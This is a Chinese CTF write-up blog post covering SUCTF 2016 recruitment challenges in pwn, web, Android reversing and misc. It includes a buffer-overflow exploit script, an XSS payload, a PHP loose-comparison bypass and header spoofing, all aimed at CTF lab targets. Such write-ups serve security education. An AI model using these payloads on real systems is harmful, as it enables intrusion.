<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SUCTF 招新赛 Writeup | Asuri Team</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="本来说好的招新赛，结果南航有一堆老司机混进去做题，而且主办方可以随时放题，因此最终题目难度变得没那么简单了。虽然出题的都是队友（队友：“我才没你这么差的队友呢！”），然而还是由于技术不过关，有些看似基础的东西仍然没有做出来。接下来就把我会做的题目写一下吧。 下面的顺序是按照在页面中显示的顺序，而非难度顺序。 [PWN] 这是你 hello pwn？拖进 IDA，看到 main 函数是这样的： 12">
<meta property="og:type" content="article">
<meta property="og:title" content="SUCTF 招新赛 Writeup">
<meta property="og:url" content="http://asuri.org/2016/11/06/2016-suctf-writeup/index.html">
<meta property="og:site_name" content="Asuri Team">
<meta property="og:description" content="本来说好的招新赛，结果南航有一堆老司机混进去做题，而且主办方可以随时放题，因此最终题目难度变得没那么简单了。虽然出题的都是队友（队友：“我才没你这么差的队友呢！”），然而还是由于技术不过关，有些看似基础的东西仍然没有做出来。接下来就把我会做的题目写一下吧。 下面的顺序是按照在页面中显示的顺序，而非难度顺序。 [PWN] 这是你 hello pwn？拖进 IDA，看到 main 函数是这样的： 12">
<meta property="og:locale">
<meta property="article:published_time" content="2016-11-06T19:23:00.000Z">
<meta property="article:modified_time" content="2023-04-07T12:29:53.434Z">
<meta property="article:author" content="All Members">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="suctf">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  

<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <div id="container">
    

    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Asuri Team</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/members">Members</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2016-suctf-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/11/06/2016-suctf-writeup/" class="article-date">
  <time datetime="2016-11-06T19:23:00.000Z" itemprop="datePublished">2016-11-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      SUCTF 招新赛 Writeup
    </h1>
  


  <div class="article-author">
    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
    <div class="article-author-info">
      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
    </div>
  </div>


      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>本来说好的招新赛，结果南航有一堆老司机混进去做题，而且主办方可以随时放题，因此最终题目难度变得没那么简单了。虽然出题的都是队友（队友：“我才没你这么差的队友呢！”），然而还是由于技术不过关，有些看似基础的东西仍然没有做出来。接下来就把我会做的题目写一下吧。</p>
<p>下面的顺序是按照在页面中显示的顺序，而非难度顺序。</p>
<h1 id="PWN-这是你-hello-pwn？"><a href="#PWN-这是你-hello-pwn？" class="headerlink" title="[PWN] 这是你 hello pwn？"></a>[PWN] 这是你 hello pwn？</h1><p>拖进 IDA，看到 <code>main</code> 函数是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;let&#x27;s begin!\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v4, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然是缓冲区溢出，然后注意到左边的 Function Window 里面有个 <code>getflag</code> 函数，地址为 <code>0804865D</code>，内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> format; <span class="comment">// [sp+14h] [bp-84h]@4</span></span><br><span class="line">    <span class="keyword">char</span> s1;     <span class="comment">// [sp+28h] [bp-70h]@3</span></span><br><span class="line">    FILE *v3;    <span class="comment">// [sp+8Ch] [bp-Ch]@1</span></span><br><span class="line">    v3 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the flag is :&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;SUCTF&#123;dsjwnhfwidsfmsainewmnci&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now,this chengxu wil tuichu.........&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pwn100@test-vm-x86:$&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;zhimakaimen&quot;</span>) )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    __isoc99_fscanf(v3, <span class="string">&quot;%s&quot;</span>, &amp;format);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此思路是先输入 112 个字节，然后覆盖 <code>main</code> 的返回指针为 <code>0804865D</code>，然后输入 <code>zhimakaimen</code> 即可，话说那个输出伪终端提示符的句子也真是……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;xxx.xxx.xxx.xxx&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">r.send(<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> + <span class="string">&#x27;\x5d\x86\x04\x08&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>不知道为啥，我在最后写上 <code>r.send(&#39;zhimakaimen&#39;)</code> 并不管用，因此只能手动输入了。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let&#x27;s begin!</span><br><span class="line">the flag is :SUCTF&#123;dsjwnhfwidsfmsainewmnci&#125;</span><br><span class="line">now,this chengxu wil tuichu.........</span><br><span class="line">pwn100@test-vm-x86:$$ zhimakaimen</span><br><span class="line">SUCTF&#123;5tack0verTlow_!S_s0_e4sy&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Web-flag-在哪？"><a href="#Web-flag-在哪？" class="headerlink" title="[Web] flag 在哪？"></a>[Web] flag 在哪？</h1><p>打开网址，抓包可以发现在 HTTP 头里面有 Cookie：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:flag=suctf%7BThi5_i5_a_baby_w3b%7D</span><br></pre></td></tr></table></figure>

<p>即可得出 flag。</p>
<h1 id="Web-编码"><a href="#Web-编码" class="headerlink" title="[Web] 编码"></a>[Web] 编码</h1><p>打开网页，里面有个输入框和一个被 disabled 掉的提交按钮，抓包发现 HTTP 头中有 Password：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Password</span>: VmxST1ZtVlZNVFpVVkRBOQ==</span><br></pre></td></tr></table></figure>

<p>扔到 Base64 里面解出来是 <code>VlROVmVVMTZUVDA9</code>，一开始看到这编码我一脸懵逼，但是后来发现只需要再扔进 Base64 解几次就行了……最终解出来是 <code>Su233</code>。是够 233 的，把它输进去，用 Chrome 修改网页结构让按钮变得可以提交，最终得出 flag：<code>suctf&#123;Su_is_23333&#125;</code>。</p>
<h1 id="Web-XSS1"><a href="#Web-XSS1" class="headerlink" title="[Web] XSS1"></a>[Web] XSS1</h1><p>只有一个输入框和提交按钮，过滤了 <code>script</code> 字符串，于是想到了用标签的 <code>onerror</code> 属性：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/pre&gt;&lt;img src=# onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>提交之后可得 flag：<code>suctf&#123;too_eaSy_Xss&#125;</code>。</p>
<h1 id="Web-PHP是世界上最好的语言"><a href="#Web-PHP是世界上最好的语言" class="headerlink" title="[Web] PHP是世界上最好的语言"></a>[Web] PHP是世界上最好的语言</h1><p>网页内容为空，查看源代码可以看到一段 PHP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]) &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]) == <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/opt/flag.txt&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;xedni.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>经典的 PHP 两个等号的 Feature，随便找一个 md5 之后是 <code>0e</code> 开头的字符串即可。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/xedni.php?password=s878926199a</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>suctf&#123;PHP_!s_the_bEst_1anguage&#125;</code>。</p>
<h1 id="Web-゜-゜-つロ-乾杯"><a href="#Web-゜-゜-つロ-乾杯" class="headerlink" title="[Web] ( ゜- ゜)つロ 乾杯~"></a>[Web] ( ゜- ゜)つロ 乾杯~</h1><p>AAEncode 编码，本质跟 eval 混淆压缩相似，可以找在线解码器，也可以直接去掉最后调用的部分（这样可以得出一个函数，然后在 Chrome 的控制台中点击进去即可复制内容）。内容是一段 Brainfuck，直接找在线解析器就可以了。得到 flag：<code>suctf&#123;aAenc0de_and_bra1nf**k&#125;</code>。</p>
<h1 id="Web-你是谁？你从哪里来？"><a href="#Web-你是谁？你从哪里来？" class="headerlink" title="[Web] 你是谁？你从哪里来？"></a>[Web] 你是谁？你从哪里来？</h1><p>只允许 <a target="_blank" rel="noopener" href="http://www.suctf.com/">http://www.suctf.com</a> 这个服务器访问该页面，修改 Origin 和 X-Forwarded-For 即可：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Origin</span>: http://www.suctf.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>suctf&#123;C0ndrulation!_y0u_f1n1shed&#125;</code>。</p>
<h1 id="Web-XSS2"><a href="#Web-XSS2" class="headerlink" title="[Web] XSS2"></a>[Web] XSS2</h1><p>这题不知道坑了多少人，虽然题目名称是 XSS，但是这其实是一道隐写。题目中给的路径 <code>http://xxx.xxx.xxx.xxx/44b22f2bf7c7cfa05c351a5bf228fee0/xss2.php</code> 去掉最后的 <code>xss2.php</code> 后有列目录权限，可以看到里面有张图片：<code>914965676719256864.tif</code>，直接用 <code>strings</code> 命令搜索一下即可得到 flag：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads# strings 914965676719256864.tif | grep suctf</span><br><span class="line">suctf&#123;te1m_need_c0mmun1catlon&#125;&lt;/photoshop:LayerText&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Mobile-最基础的安卓逆向题"><a href="#Mobile-最基础的安卓逆向题" class="headerlink" title="[Mobile] 最基础的安卓逆向题"></a>[Mobile] 最基础的安卓逆向题</h1><p>用 <code>dex2jar</code> 反编译，用 <code>jd-gui</code> 打开之后，在 <code>MainActivity</code> 中直接发现了 flag：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String flag = <span class="string">&quot;suctf&#123;Crack_Andr01d+50-3asy&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h1 id="Mobile-Mob200"><a href="#Mobile-Mob200" class="headerlink" title="[Mobile] Mob200"></a>[Mobile] Mob200</h1><p>反编译之后发现 <code>Encrypt.class</code> 是 AES 类，key 似乎与图片有些关系，但是 AES 的加密和解密用的是同一个 key，因此直接抄过来即可。折腾了若干次 Java 之后才知道，有些函数不适用于 PC Java，而只能在安卓上用，因此新建了一个项目，将所有用到的代码都复制进来，补全了 <code>Encrypt.class</code> 中的解密部分，自己写了一个 <code>MainActivity</code>，导入了图片资源，调试工程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doDecrypt</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">char</span>[] arrayOfChar = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">16</span>];</span><br><span class="line">            BufferedReader localBufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(ContextHolder.getContext().getAssets().open(<span class="string">&quot;kawai.jpg&quot;</span>)));</span><br><span class="line">            localBufferedReader.skip(<span class="number">424L</span>);</span><br><span class="line">            localBufferedReader.read(arrayOfChar);</span><br><span class="line">            localBufferedReader.close();</span><br><span class="line">            String str = <span class="keyword">new</span> String(decrypt(Base64.decode(paramString.getBytes(), <span class="number">2</span>), <span class="keyword">this</span>.key.getBytes(), charArrayToByteArray(arrayOfChar)));</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception localException) &#123;</span><br><span class="line">            localException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> paramString;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] paramArrayOfByte1, <span class="keyword">byte</span>[] paramArrayOfByte2, <span class="keyword">byte</span>[] paramArrayOfByte3) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte = transformKey(paramArrayOfByte2);</span><br><span class="line">        Cipher localCipher = Cipher.getInstance(<span class="string">&quot;AES/CFB/PKCS7Padding&quot;</span>);</span><br><span class="line">        localCipher.init(Cipher.DECRYPT_MODE, <span class="keyword">new</span> SecretKeySpec(arrayOfByte, <span class="string">&quot;AES&quot;</span>), <span class="keyword">new</span> IvParameterSpec(paramArrayOfByte3));</span><br><span class="line">        <span class="keyword">return</span> localCipher.doFinal(paramArrayOfByte1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    String correct = <span class="string">&quot;XclSH6nZEPVd41FsAsqeChz6Uy+HFzV8Cl9jqMyg6mMrcgSoM0vJtA1BpApYahCY&quot;</span>;</span><br><span class="line">    Encrypt encrypt = <span class="keyword">new</span> Encrypt();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        String clear = <span class="keyword">this</span>.encrypt.doDecrypt(<span class="keyword">this</span>.correct);</span><br><span class="line">        System.out.println(clear);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>suctf&#123;andr01d_encrypt_s0much_4un&#125;</code>。</p>
<h1 id="Mobile-mips"><a href="#Mobile-mips" class="headerlink" title="[Mobile] mips"></a>[Mobile] mips</h1><p>正如名字所述是一段 MIPS 汇编。我的 MIPS 并不熟，IDA 也没装 MIPS 的插件，然而有个在线网站特别好：<a target="_blank" rel="noopener" href="https://retdec.com/decompilation/">https://retdec.com/decompilation/</a> ，可以将一些常见的汇编转换为可编译通过的 C 代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * g1 = <span class="string">&quot;\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a&quot;</span>; <span class="comment">// 0x410aa0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> str = <span class="number">0</span>; <span class="comment">// bp-52</span></span><br><span class="line">    <span class="keyword">int32_t</span> str2 = <span class="number">0</span>; <span class="comment">// bp-32</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input Key:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>, &amp;str);</span><br><span class="line">    <span class="keyword">int32_t</span> v1 = <span class="number">0</span>; <span class="comment">// bp-56</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;str) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>((<span class="keyword">char</span> *)&amp;str2, (<span class="keyword">char</span> *)&amp;g1, <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;suctf&#123;%s&#125;\r\n&quot;</span>, &amp;str);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;please reverse me!\r&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int32_t</span> v2 = <span class="number">0</span>; <span class="comment">// 0x4008148</span></span><br><span class="line">    <span class="keyword">int32_t</span> v3 = v2 + (<span class="keyword">int32_t</span>)&amp;v1; <span class="comment">// 0x4007c0</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v4 = *(<span class="keyword">char</span> *)(v3 + <span class="number">4</span>); <span class="comment">// 0x4007c4</span></span><br><span class="line">    *(<span class="keyword">char</span> *)(v3 + <span class="number">24</span>) = (<span class="keyword">char</span>)((<span class="keyword">int32_t</span>)v4 ^ v2);</span><br><span class="line">    v1++;</span><br><span class="line">    <span class="keyword">while</span> (v1 &lt; <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;str)) &#123;</span><br><span class="line">        v2 = v1;</span><br><span class="line">        v3 = v2 + (<span class="keyword">int32_t</span>)&amp;v1;</span><br><span class="line">        v4 = *(<span class="keyword">char</span> *)(v3 + <span class="number">4</span>);</span><br><span class="line">        *(<span class="keyword">char</span> *)(v3 + <span class="number">24</span>) = (<span class="keyword">char</span>)((<span class="keyword">int32_t</span>)v4 ^ v2);</span><br><span class="line">        v1++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>((<span class="keyword">char</span> *)&amp;str2, (<span class="keyword">char</span> *)&amp;g1, <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;suctf&#123;%s&#125;\r\n&quot;</span>, &amp;str);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please reverse me!\r&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>稍加整理，可以看出来是一个循环，<code>v4</code> 本质是 <code>str[i]</code>，<code>v3 + 24</code> 本质是 <code>str[i + 5]</code>。也就是说，这段代码先获取你的输入，然后一个循环将第 i 位的字符异或一下 <code>i</code>，因此解密也超级好写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> g[] = <span class="string">&quot;\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(g); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, g[i] ^ i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>suctf&#123;X0r_1s_n0t_h4rd&#125;</code>。</p>
<h1 id="Mobile-Mob300"><a href="#Mobile-Mob300" class="headerlink" title="[Mobile] Mob300"></a>[Mobile] Mob300</h1><p>解压 apk 之后发现里面加载了各种平台下的一个叫 <code>libnative-lib.so</code> 的文件，于是挑了一个最熟悉的平台：x86，用 IDA 反汇编，发现里面的函数超级少，每个函数的语句也超级少，于是就一点点看了。<code>Java_com_suctf_naive_MainActivity_getHint(int a1)</code> 函数里面其实是拼了一个字符串：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v8 = &#x27;!ga&#x27;;</span><br><span class="line">v7 = &#x27;lf e&#x27;;</span><br><span class="line">v6 = &#x27;ht s&#x27;;</span><br><span class="line">v5 = &#x27;i ta&#x27;;</span><br><span class="line">v4 = &#x27;hw s&#x27;;</span><br><span class="line">v3 = &#x27;seuG&#x27;;</span><br></pre></td></tr></table></figure>

<p>这特么不就是 <code>Guess what is the flag!</code>？然后看到 <code>Java_com_suctf_naive_MainActivity_getFlag(int a1)</code> 函数和 <code>flag_gen(void)</code> 函数内容基本是一样的，里面也在拼字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag_global = xmmword_5D0;</span><br><span class="line">flag_global[4] = &#x27;uf_0&#x27;;</span><br><span class="line">flag_global[10] = &#x27;&#125;n&#x27;;</span><br><span class="line">flag_global[<span class="number">22</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>双击 <code>xmmword_5D0</code>，然后右键将其转换为字符串，可得：<code>5_inj_teeM&#123;ftcus</code>，于是得出 flag：<code>suctf&#123;Meet_jni_50_fun&#125;</code>。</p>
<h1 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="[Misc] 签到"></a>[Misc] 签到</h1><p>加群，在群文件中可以得到 flag：<code>suctf&#123;Welc0me_t0_suCTF&#125;</code>。</p>
<h1 id="Misc-Misc-50"><a href="#Misc-Misc-50" class="headerlink" title="[Misc] Misc-50"></a>[Misc] Misc-50</h1><p>下载下来是一个 GIF 图像，每隔六秒刷新一次，图像是一个竖条。后来发现其实是一个浏览大图的窗格，于是用 PS 将所有图层从左到右拼起来即可得到 flag：<code>suctf&#123;t6cV165qUpEnZVY8rX&#125;</code>。</p>
<h1 id="Misc-Forensic-100"><a href="#Misc-Forensic-100" class="headerlink" title="[Misc] Forensic-100"></a>[Misc] Forensic-100</h1><p>下载下来是一个文件，用 <code>file</code> 看一下发现是 Gzip 压缩，用 <code>gzip</code> 命令解压。</p>
